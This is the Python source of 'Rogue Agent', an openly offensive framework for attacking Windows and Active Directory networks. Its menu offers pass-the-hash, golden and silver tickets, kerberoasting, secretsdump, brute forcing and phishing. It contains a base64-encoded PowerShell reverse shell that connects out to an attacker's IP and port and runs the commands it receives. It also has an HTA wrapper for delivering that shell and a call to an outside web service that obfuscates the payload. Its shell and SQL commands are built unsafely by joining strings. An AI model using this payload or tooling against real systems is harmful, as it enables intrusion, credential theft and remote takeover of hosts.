#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#         PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF COMPUTER NETWORKS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import time
import getopt
import base64
import string
import random
import hashlib
import os.path
import sqlite3
import binascii
import pyfiglet
import datetime
import requests
import linecache

from termcolor import colored
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcomrt import IObjectExporter
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Create functional subroutines called from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def test_DNS():
   if DNS[:5] == "EMPTY":
      print("[-] DNS has not been specified...")
      return 1
   else:
      return 0

def test_IP():
   if TIP[:5] == "EMPTY":
      print("[-] REMOTE IP has not been specified...")
      return 1
   else:
      return 0
   
def test_Domain():
   if DOM[:5] == "EMPTY":
      print("[-] DOMAIN name has not been specified...")
      return 1
   else:
      return 0  
   
def testUsername():
   if USR == "":
      print("[-] USERNAME has not been specified...")
      return 1
   else:
      return 0
      
def testPassword():
   if PAS == "":
      print("[-] PASSWORD has not been specified...")
      return 1
   else:
      return 0
      
def testSID():
   if SID[:5] == "EMPTY":
      print("[-] Domain SID has not been specified...")
      return 1
   else:
      return 0
   
def test_Port(variable):
   if variable not in PTS:
      print("[-] Port " + variable + " not found in live ports...")
      return 1
   else:
      return 0

def test_Share():
   if TSH[:5] == "EMPTY":
      print("[-] SHARE NAME has not been specified...")
      return 1
   else:
      return 0
      
def lineCount(variable):
   command("cat " + variable + " | wc -m > count1.tmp")
   count = (linecache.getline("count1.tmp", 1).rstrip("\n"))
   if count == 0:
      return int(count)
   else:
      command("cat " + variable + " | wc -l > count2.tmp")
      count = (linecache.getline("count2.tmp", 1).rstrip("\n"))
   return int(count)

def spacePadding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value]
   while len(variable) < value:
      variable += " "
   return variable

def dotPadding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value] 
   while len(variable) < value:
      variable += "."
   return variable

def getTime():
   variable = str(datetime.datetime.now().time())
   variable = variable.split(".")
   variable = variable[0]
   variable = variable.split(":")
   variable = variable[0] + ":" + variable[1]
   variable = spacePadding(variable, COL1)
   return variable   
   
def getPort():
   port = input("[?] Please enter the listening port number: ")
   if port.isdigit():
      return port
   else:
      print("[-] Sorry, I did not understand the value " + port + "...")
      return 1

def command(variable):
   if bugHunt == 1:
      print(colored(variable, colour5))
   os.system(variable)
   return
 
def prompt():
   null = input("\nPress ENTER to continue...")
   return
   
def wipeTokens(VALD):
   command("rm    " + dataDir + "/tokens.txt")
   command("touch " + dataDir + "/tokens.txt") 
   for x in range(0, maxUser):
      VALD[x] = "0"
   return
   
def saveParams():
   command("echo '" + COM + "' | base64 --wrap=0 >  base64.tmp")
   command("echo '" + DNS + "' | base64 --wrap=0 >> base64.tmp")
   command("echo '" + TIP + "' | base64 --wrap=0 >> base64.tmp")   
   command("echo '" + PTS + "' | base64 --wrap=0 >> base64.tmp")
   command("echo '" + WEB + "' | base64 --wrap=0 >> base64.tmp")
   command("echo '" + USR + "' | base64 --wrap=0 >> base64.tmp")
   command("echo '" + PAS + "' | base64 --wrap=0 >> base64.tmp")
   command("echo '" + NTM + "' | base64 --wrap=0 >> base64.tmp")
   command("echo '" + TGT + "' | base64 --wrap=0 >> base64.tmp")   
   command("echo '" + DOM + "' | base64 --wrap=0 >> base64.tmp")
   command("echo '" + SID + "' | base64 --wrap=0 >> base64.tmp")
   command("echo '" + TSH + "' | base64 --wrap=0 >> base64.tmp")    
     
   COM2 = linecache.getline("base64.tmp", 1).rstrip("\n")
   DNS2 = linecache.getline("base64.tmp", 2).rstrip("\n")
   TIP2 = linecache.getline("base64.tmp", 3).rstrip("\n")
   PTS2 = linecache.getline("base64.tmp", 4).rstrip("\n")
   WEB2 = linecache.getline("base64.tmp", 5).rstrip("\n")
   USR2 = linecache.getline("base64.tmp", 6).rstrip("\n")
   PAS2 = linecache.getline("base64.tmp", 7).rstrip("\n")
   NTM2 = linecache.getline("base64.tmp", 8).rstrip("\n")
   TGT2 = linecache.getline("base64.tmp", 9).rstrip("\n")
   DOM2 = linecache.getline("base64.tmp", 10).rstrip("\n")
   SID2 = linecache.getline("base64.tmp", 11).rstrip("\n")
   TSH2 = linecache.getline("base64.tmp", 12).rstrip("\n")   
   
   cursor.execute("UPDATE REMOTETARGET SET COM = \"" + COM2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DNS = \"" + DNS2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TIP = \"" + TIP2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET PTS = \"" + PTS2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET WEB = \"" + WEB2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET USR = \"" + USR2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET PAS = \"" + PAS2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET NTM = \"" + NTM2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TGT = \"" + TGT2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DOM = \"" + DOM2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET SID = \"" + SID2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TSH = \"" + TSH2 + "\" WHERE IDS = 1"); connection.commit()   
   return
     
def privCheck():
   command("ls  | grep ccache > ticket.tmp")   
   count = lineCount("ticket.tmp")
   
   if count > 1:
      print("[i] More than one ticket was found...") 
           
   for x in range(1, count):
      ticket = linecache.getline("ticket.tmp", x).rstrip("\n")
      ticket = ticket.rstrip(" ")
      if ticket != "":
         command("export KRB5CCNAME=" + ticket)
         print(colored("[*] Checking ticket status for " + ticket + "...", colour3))
         command(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
      else:
         print("[-] Unable to find a valid ticket...")
      return

def keys():
   print("\tHKEY_CLASSES_ROOT   HKCR")
   print("\tHKEY_CURRENT_USER   HKCU")
   print("\tHKEY_LOCAL_MACHINE  HKLM")
   print("\tHKEY_USERS          HKU ")
   print("\tHKEY_CURRENT_CONFIG HKCC")
   return
   
def checkInterface(variable, COM):
   print(colored("[*] Checking network interface...", colour3))  
   try:      
      authLevel = RPC_C_AUTHN_LEVEL_NONE      
      if variable == "DNS":
         stringBinding = r'ncacn_ip_tcp:%s' % DNS.rstrip(" ")
      if variable == "TIP":
         stringBinding = r'ncacn_ip_tcp:%s' % TIP.rstrip(" ") 
                 
      rpctransport = transport.DCERPCTransportFactory(stringBinding)
      portmap = rpctransport.get_dce_rpc()
      portmap.set_auth_level(authLevel)
      portmap.connect()
      objExporter = IObjectExporter(portmap)
      bindings = objExporter.ServerAlive2()      
      checkParams = 0      
      
      for binding in bindings:
         NetworkAddr = binding['aNetworkAddr']                  
         if checkParams == 0:
            if "." not in NetworkAddr:
               print("[+] Found interface...\n")
               COM = NetworkAddr
               COM = COM.replace(chr(0), '')
               checkParams = 1               
         print(colored("Address: " + NetworkAddr, colour6))   
               
   except:
      print("[-] No responce from network interface, checking connection instead...\n")
      COM = spacePadding("UNKNOWN", COL0)      
      if variable == "DNS":
           command("ping -c 5 " + DNS.rstrip(" "))
      if variable == "TIP":
           command("ping -c 5 " + TIP.rstrip(" "))
   COM = spacePadding(COM, COL0)
   return COM
   
def idGenerator(size=6, chars=string.ascii_uppercase + string.digits):
   return ''.join(random.choice(chars) for _ in range(size))
   
def body(content):
   body = f"""<html>
   <head>
   <HTA:APPLICATION id="{idGenerator()}"
   applicationName="{idGenerator()}"
   border="thin"
   borderStyle="normal"
   caption="yes"
   icon="http://127.0.0.1/{idGenerator()}.ico"
   maximizeButton="yes"
   minimizeButton="yes"
   showInTaskbar="no"
   windowState="normal"
   innerBorder="yes"
   navigable="yes"
   scroll="auto"
   scrollFlat="yes"
   singleInstance="yes"
   sysMenu="yes"
   contextMenu="yes"
   selection="yes"
   version="1.0" />
   <script>
   {content}
   </script>
   <title>{idGenerator()}</title>
   </head>
   <body>
   <h1>{idGenerator()}</h1>
   <hr>
   </body>
   </html>"""
   return body   
   
def encrypt(payload):
   # https://github.com/felamos/weirdhta
   api_url = "https://enigmatic-shore-46592.herokuapp.com/api/weirdhta"
   data = r"""{"code" : "%s"}""" % (payload.decode())
   header = {"Content-Type": "application/json"}
   r = requests.post(api_url, headers=header, data=data)
   return r.text
   
def powershell(ip, port):
   # https://forums.hak5.org/topic/39754-reverse-tcp-shell-using-ms-powershell-only/
   revB64 = "IHdoaWxlICgxIC1lcSAxKQp7CiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ0NvbnRpbnVlJzsKICAgIHRyeQogICAgewogICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoIlNVUEVSSVBBIiwgUE9SVCk7CiAgICAgICAgJHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7CiAgICAgICAgW2J5dGVbXV0kYnl0ZXMgPSAwLi4yNTV8JXswfTsKICAgICAgICAkc2VuZGJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCJDbGllbnQgQ29ubmVjdGVkLi4uIisiYG5gbiIgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKTsKICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZXMsMCwkc2VuZGJ5dGVzLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpOwogICAgICAgIHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkKICAgICAgICB7CiAgICAgICAgICAgICRyZWNkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOwogICAgICAgICAgICBpZigkcmVjZGF0YS5TdGFydHNXaXRoKCJraWxsLWxpbmsiKSl7IGNsczsgJGNsaWVudC5DbG9zZSgpOyBleGl0O30KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNhdHRlbXB0IHRvIGV4ZWN1dGUgdGhlIHJlY2VpdmVkIGNvbW1hbmQKICAgICAgICAgICAgICAgICRzZW5kYmFjayA9IChpZXggJHJlY2RhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsKICAgICAgICAgICAgICAgICRzZW5kYmFjazIgID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICRlcnJvclswXS5JbnZvY2F0aW9uSW5mby5Qb3NpdGlvbk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAkc2VuZGJhY2syICA9ICAiRVJST1I6ICIgKyAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICJgbmBuIiArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7CiAgICAgICAgICAgICAgICBjbHM7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHJldHVybmJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgICAgICAgICAkc3RyZWFtLldyaXRlKCRyZXR1cm5ieXRlcywwLCRyZXR1cm5ieXRlcy5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKTsgICAgICAgICAgCiAgICAgICAgfQogICAgfQogICAgY2F0Y2ggCiAgICB7CiAgICAgICAgaWYoJGNsaWVudC5Db25uZWN0ZWQpCiAgICAgICAgewogICAgICAgICAgICAkY2xpZW50LkNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIGNsczsKICAgICAgICBTdGFydC1TbGVlcCAtcyAzMDsKICAgIH0gICAgIAp9IAo="
   revPlain = base64.b64decode(revB64).decode()
   rev = revPlain.replace("SUPERIPA" , ip).replace("PORT", port)
   payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
   return payload
   
def fileCheck(variable):
   if os.path.getsize(variable) == 0:
      if os.path.exists("/usr/share/ncrack/minimal.usr"):
         print("[+] Adding mimimal userlist to " + variable + "...")
         command("cat /usr/share/ncrack/minimal.usr >> " + variable + " 2>&1")
         command("sed -i '/#/d' " + variable + " 2>&1")
         command("sed -i '/Email addresses found/d' " + variable + " 2>&1")
         command("sed -i '/---------------------/d' " + variable + " 2>&1")
   else:
      print("[!] Checked file " + variable + " contains data...")
   return
   
def banner(variable):
   command("clear")
   ascii_banner = pyfiglet.figlet_format(variable)
   ascii_banner = ascii_banner.rstrip("\n")
   print(colored(ascii_banner,colour0, attrs=['bold']))
   command("pyfiglet " + variable + " > banner.tmp")
   return

def display():
   print('\u2554' + ('\u2550')*14 + '\u2566' + ('\u2550')*42 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2557')
   print('\u2551' + " TIME ", end =' ')   
   if SKEW == 0:
      print(colored(LTM[:6],colour7), end=' ')
   else:
      print(colored(LTM[:6],colour6), end=' ')      
   print('\u2551' + " " + colored("REMOTE COMPUTER NAME",colour5), end=' ')   
   if COM[:7] == "UNKNOWN":
      print(colored(COM.upper(),colour7), end=' ')
   else:
      print(colored(COM.upper(),colour6), end=' ')      
   print('\u2551' + (" ")*1 + colored("SHARENAME",colour5) + (" ")*7 + colored("TYPE",colour5) + (" ")*6 + colored("COMMENT",colour5) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAME",colour5) + (" ")*16 + colored("NTFS PASSWORD HASH",colour5) + (" ")*15 + '\u2551') 
   print('\u2560' + ('\u2550')*14 + '\u256C' + ('\u2550')*42 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u2563')
   
   print('\u2551' + " DNS ADDRESS  " + '\u2551', end=' ')
   if DNS[:5] == "EMPTY":
      print(colored(DNS[:COL1],colour7), end=' ')
   else:
      print(colored(DNS[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[0]:
      print(colored(SHAR[0],colour3), end=' ')
   else:
      print(colored(SHAR[0],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[0] == "1":
      print(colored(USER[0],colour2), end=' ')
      print(colored(HASH[0],colour2), end=' ')
   else:
      print(colored(USER[0],colour6), end=' ')
      print(colored(HASH[0],colour6), end=' ')   
   print('\u2551')
   
   print('\u2551' + " IP  ADDRESS  " + '\u2551', end=' ')
   if TIP[:5] == "EMPTY":
      print(colored(TIP[:COL1],colour7), end=' ')
   else:
      print(colored(TIP[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[1]:
      print(colored(SHAR[1],colour3), end=' ')
   else:
      print(colored(SHAR[1],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[1] == "1":
      print(colored(USER[1],colour2), end=' ')
      print(colored(HASH[1],colour2), end=' ')
   else:
      print(colored(USER[1],colour6), end=' ')
      print(colored(HASH[1],colour6), end=' ')         
   print('\u2551')
   
   print('\u2551' + " LIVE  PORTS  " + '\u2551', end=' ')
   if POR[:5] == "EMPTY":
      print(colored(POR[:COL1],colour7), end=' ')
   else:
      lastChar = POR[COL1-1]
      print(colored(POR[:COL1-1],colour6) + colored(lastChar,colour0), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[2]:
      print(colored(SHAR[2],colour3), end=' ')
   else:
      print(colored(SHAR[2],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[2] == "1":
      print(colored(USER[2],colour2), end=' ')
      print(colored(HASH[2],colour2), end=' ')
   else:
      print(colored(USER[2],colour6), end=' ')
      print(colored(HASH[2],colour6), end=' ')         
   print('\u2551')
   
   print('\u2551' + " WEBSITE URL  " + '\u2551', end=' ')
   if WEB[:5] == "EMPTY":
      print(colored(WEB[:COL1],colour7), end=' ')
   else:
      print(colored(WEB[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[3]:
      print(colored(SHAR[3],colour3), end=' ')
   else:
      print(colored(SHAR[3],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[3] == "1":
      print(colored(USER[3],colour2), end=' ')
      print(colored(HASH[3],colour2), end=' ')
   else:
      print(colored(USER[3],colour6), end=' ')
      print(colored(HASH[3],colour6), end=' ')         
   print('\u2551')
   
   print('\u2551' + " USER   NAME  " + '\u2551', end=' ')
   if USR[:2] == "''":
      print(colored(USR[:COL1],colour7), end=' ')
   else:
      print(colored(USR[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[4]:
      print(colored(SHAR[4],colour3), end=' ')
   else:
      print(colored(SHAR[4],colour6), end=' ')   
   print('\u2551', end=' ')
   if VALD[4] == "1":
      print(colored(USER[4],colour2), end=' ')
      print(colored(HASH[4],colour2), end=' ')
   else:
      print(colored(USER[4],colour6), end=' ')
      print(colored(HASH[4],colour6), end=' ')   
   print('\u2551')
   
   print('\u2551' + " PASS   WORD  " + '\u2551', end=' ')
   if PAS[:2] == "''":
      print(colored(PAS[:COL1],colour7), end=' ')
   else:
      print(colored(PAS[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[5]:
      print(colored(SHAR[5],colour3), end=' ')
   else:
      print(colored(SHAR[5],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[5] == "1":
      print(colored(USER[5],colour2), end=' ')
      print(colored(HASH[5],colour2), end=' ')
   else:
      print(colored(USER[5],colour6), end=' ')
      print(colored(HASH[5],colour6), end=' ')         
   print('\u2551')
   
   print('\u2551' + " NTLM   HASH  " + '\u2551', end=' ')
   if NTM[:5] == "EMPTY":
      print(colored(NTM[:COL1],colour7), end=' ')
   else:
      print(colored(NTM[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[6]:
      print(colored(SHAR[6],colour3), end=' ')
   else:
      print(colored(SHAR[6],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[6] == "1":
      print(colored(USER[6],colour2), end=' ')
      print(colored(HASH[6],colour2), end=' ')
   else:
      print(colored(USER[6],colour6), end=' ')
      print(colored(HASH[6],colour6), end=' ')         
   print('\u2551')
   
   print('\u2551' + " TICKET NAME  " + '\u2551', end=' ')
   if TGT[:5] == "EMPTY":
      print(colored(TGT[:COL1],colour7), end=' ')
   else:
      print(colored(TGT[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[7]:
      print(colored(SHAR[7],colour3), end=' ')
   else:
      print(colored(SHAR[7],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[6] == "1":
      print(colored(USER[7],colour2), end=' ')
      print(colored(HASH[7],colour2), end=' ')
   else:
      print(colored(USER[7],colour6), end=' ')
      print(colored(HASH[7],colour6), end=' ')         
   print('\u2551')
   
   print('\u2551' + " DOMAIN NAME  " + '\u2551', end=' ')
   if DOM[:5] == "EMPTY":
      print(colored(DOM[:COL1],colour7), end=' ')
   else:
      print(colored(DOM[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[8]:
      print(colored(SHAR[8],colour3), end=' ')
   else:
      print(colored(SHAR[8],colour6), end=' ')      
   print('\u2551', end=' ')   
   if VALD[7] == "1":
      print(colored(USER[8],colour2), end=' ')
      print(colored(HASH[8],colour2), end=' ')
   else:
      print(colored(USER[8],colour6), end=' ')
      print(colored(HASH[8],colour6), end=' ')         
   print('\u2551')
   
   print('\u2551' + " DOMAIN  SID  " + '\u2551', end=' ')
   if SID[:5] == "EMPTY":
      print(colored(SID[:COL1],colour7), end=' ')
   else:
      print(colored(SID[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[9]:
      print(colored(SHAR[9],colour3), end=' ')
   else:
      print(colored(SHAR[9],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[8] == "1":
      print(colored(USER[9],colour2), end=' ')
      print(colored(HASH[9],colour2), end=' ')
   else:
      print(colored(USER[9],colour6), end=' ')
      print(colored(HASH[9],colour6), end=' ')         
   print('\u2551')
   
   print('\u2551' + " SHARE  NAME  " + '\u2551', end=' ')
   if TSH[:5] == "EMPTY":
      print(colored(TSH[:COL1],colour7), end=' ')
   else:
      print(colored(TSH[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[10]:
      print(colored(SHAR[10],colour3), end=' ')
   else:
      print(colored(SHAR[10],colour6), end=' ')      
   print('\u2551', end=' ')   
   if VALD[9] == "1":
      print(colored(USER[10],colour2), end=' ')
      print(colored(HASH[10],colour2), end=' ')
   else:
      if USER[11][:1] != "":
         print(colored(USER[10],colour0), end=' ')
         print(colored(HASH[10],colour0), end=' ')      
      else:
         print(colored(USER[10],colour6), end=' ')
         print(colored(HASH[10],colour6), end=' ')
   print('\u2551')
   
   print('\u2560' + ('\u2550')*14 + '\u2569' + ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')
   return
   
def options():
   print('\u2551' + "(01) Re/Set DNS ADDRESS (12) Compile Exploits (23) SyncTime (34) WinLDAP Search (45) Kerberos Info (56) Domain Dump (67) Editor USER (78) Hydra  FTP (89) FTP      " + '\u2551')
   print('\u2551' + "(02) Re/Set IP  ADDRESS (13) Start HTTPServer (24) Get Arch (35) Look up SecIDs (46) Kerberos Auth (57) Blood Hound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start SMB Server (25) Net View (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69) Editor HASH (80) Hydra SMTP (91) SSHKeyID " + '\u2551')
   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start  Responder (26) Services (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) Editor HOST (81) Hydra HTTP (92) Telnet   " + '\u2551')
   print('\u2551' + "(05) Re/Set USER   NAME (16) who  DNS ADDRESS (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra  SMB (93) Netcat   " + '\u2551')
   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig  DNS ADDRESS (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra POP3 (94) SQSH     " + '\u2551')
   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Enum DNS ADDRESS (29) PS  Exec (40) RpcClient Serv (51) Pass the HASH (62) SmbExecHASH (73) GenListPass (84) Hydra  RDP (95) MSSQL    " + '\u2551')
   print('\u2551' + "(08) Re/Set TICKET NAME (19) Reco DNS ADDRESS (30) SMB Exec (41) SmbClient Serv (52) OverPass HASH (63) WmiExecHASH (74) GenPhishCod (85) Hydra  TOM (96) MySQL    " + '\u2551')
   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap LIVE  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) MSFCon TOM (97) WinRm    " + '\u2551')
   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32) NFS List (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) DIR Searchs (87) MSFCon OWA (98) RemDesk  " + '\u2551')
   print('\u2551' + "(11) Re/Set SHARE  NAME (22) Nmap Sub DOMAINS (33) NFSMount (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) MSFCon RCE (99) Exit     " + '\u2551')
   print('\u255A' + ('\u2550')*163 + '\u255D')
   return

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : START OF MAIN - Check running as root.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
   print("\n[*] Please run this python3 script as root...")
   exit(1)
else:
   bugHunt = 0
    
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Create local user-friendly variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

netWork = "tun0"						# LOCAL INTERFACE
maxUser = 5000							# UNLIMITED VALUE

colour0 = "red"							# DISPLAY COLOURS
colour1 = "grey"
colour2 = "cyan"
colour3 = "blue"
colour4 = "black"
colour5 = "white"
colour6 = "green"
colour7 = "yellow"
colour8 = "magenta"

Yellow  = '\e[1;93m'						# CATTING FILE COL
Green   = '\e[0;32m'
Reset   = '\e[0m'
Red     = '\e[1;91m'

dataDir = "ROGUEAGENT"						# LOCAL DIRECTORYS
httpDir = "TREADSTONE"
workDir = "BLACKBRIAR"
explDir = "OUTCOME"
powrDir = "LARX"

fileExt = "xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf"		# FILE EXTENSIONS
keyPath = "python3 /usr/share/doc/python3-impacket/examples/"	# PATH 2 IMPACKET

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check the local interface specified above is up.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("ifconfig -a | grep -E -o '.{0,5}: flag.{0,5}' | grep -E -o '.{0,5}:' > up.tmp")
with open("up.tmp","r") as localInterface:
   up = localInterface.readlines()
if netWork not in str(up):
   print(colored("\n[!] WARNING!!! - You need to specify your local network interface on line 595 of the rogue-agent.py file...", colour0))
   exit(1)
else:
   os.system("ip a s " + netWork + " | awk '/inet/ {print $2}' > localIP.tmp")
   localIP, null = linecache.getline("localIP.tmp", 1).rstrip("\n").split("/")
      
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Connect to local database
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if not os.path.exists(dataDir + "/RA.db"):
   print(colored("[!] WARNING!!! - Unable to connect to database...", colour0))
   exit(1)
else:
   connection = sqlite3.connect(dataDir + "/RA.db")
   cursor = connection.cursor()

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Display program banner and boot system.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

command("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return")
banner("ROGUE  AGENT")
print(colored("\t\tT R E A D S T O N E  E D I T I O N",colour7,attrs=['bold']))
print(colored("\n\n[*] Booting, please wait...", colour3))
print("[+] Using localhost IP address " + localIP + "...")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Initialise program files and variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

dirList = [dataDir, workDir, httpDir, explDir, powrDir]
for x in range(0, len(dirList)):
   if not os.path.exists(dirList[x]):
      print("[-] Missing required files, you must run install.py first...")
      exit(1)
   else:
      print("[+] Directory " + dirList[x] + " already exists...") 
              
print("[+] Populating system variables...")
if not os.path.exists(dataDir + "/usernames.txt"):			
   command("touch " + dataDir + "/usernames.txt")
   print("[+] File usernames.txt created...")
else:
   print("[+] File usernames.txt already exists...") 
        
if not os.path.exists(dataDir + "/passwords.txt"):			
   command("touch " + dataDir + "/passwords.txt")
   print("[+] File passwords.txt created...")
else:
   print("[+] File passwords.txt already exists...")  
    
if not os.path.exists(dataDir + "/hashes.txt"):			
   command("touch " + dataDir + "/hashes.txt")
   print("[+] File hashes.txt created...")
else:
   print("[+] File hashes.txt already exists...")  
      
if not os.path.exists(dataDir + "/shares.txt"):
   command("touch " + dataDir + "/shares.txt")
   print("[+] File shares.txt created...")
else:
   print("[+] File shares.txt already exists...")  
       
if not os.path.exists(dataDir + "/tokens.txt"):
   command("touch " + dataDir + "/tokens.txt")
   print("[+] File tokens.txt created...")
else:
   print("[+] File tokens.txt already exists...")
   
SKEW = 0                                # TIME-SKEW SWITCH
DOMC = 0                                # DOMAIN SWITCH
DNSC = 0                                # DNS SWITCH
HTTP = 0				# HTTP SERVER PORT
COL0 = 19				# MAX LEN COMPUTER NAME
COL1 = 40                               # MAX LEN SESSION DATA
